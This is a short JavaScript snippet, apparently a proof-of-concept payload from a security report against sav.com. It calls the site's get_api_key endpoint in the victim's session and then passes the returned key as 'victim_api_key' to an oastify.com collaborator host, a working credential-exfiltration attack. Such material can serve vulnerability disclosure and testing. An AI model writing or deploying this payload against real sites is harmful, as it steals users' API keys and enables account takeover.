fetch("https://www.sav.com/users/get_api_key", { method: "POST",
		  headers: {
		    "Content-Type": "application/json",
		  },
		  body: JSON.stringify({}),
		})
		  .then((response) => response.json())  // parse JSON
		  .then((data) => {console.log(data);fetch(`https://o7w127lvwybj87dqidv8vp2au10soh.oastify.com?victim_api_key=${JSON.stringify(data.api_key)}`)})    // log the parsed data
		  .catch((error) => console.error('Error:', error)); 
